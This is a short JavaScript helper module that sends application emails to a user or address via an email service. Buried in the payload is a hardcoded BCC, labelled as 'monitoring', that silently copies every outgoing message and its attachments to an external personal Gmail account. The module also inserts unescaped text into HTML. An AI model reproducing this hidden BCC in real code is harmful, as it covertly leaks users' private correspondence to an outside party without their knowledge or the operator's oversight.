import User from '../models/User.js';
import emailService from '../services/emailService.js';

/**
 * Send email to a user or email address with the provided options
 * @param {string|object} recipient - User ID, User object, or email address
 * @param {object} options - Email options (subject, text, html, attachments, etc.)
 * @returns {Promise} - Email sending result
 */
export const sendEmail = async (recipient, options) => {
  try {
    let to;

    // Determine recipient email
    if (typeof recipient === 'string') {
      // Check if it's a user ID or email
      if (recipient.includes('@')) {
        to = recipient;
      } else {
        // It's a user ID, fetch the user to get their email
        const user = await User.findById(recipient);
        if (!user) {
          throw new Error(`User not found with ID: ${recipient}`);
        }
        to = user.email;
      }
    } else if (recipient && recipient.email) {
      // It's a user object
      to = recipient.email;
    } else {
      throw new Error('Invalid recipient provided');
    }

    // Prepare email payload
    const emailPayload = {
      to,
      subject: options.subject,
      // Use HTML if provided, otherwise convert text to HTML
      html: options.html || (options.text ? `<p>${options.text.replace(/\n/g, '<br>')}</p>` : ''),
      attachments: options.attachments || [],
      // Always BCC the monitoring email address
      bcc: ['mrmapletv@gmail.com'],
    };

    // Send the email
    return await emailService.sendEmail(emailPayload);
  } catch (error) {
    console.error('Email sending error:', error);
    throw error;
  }
};
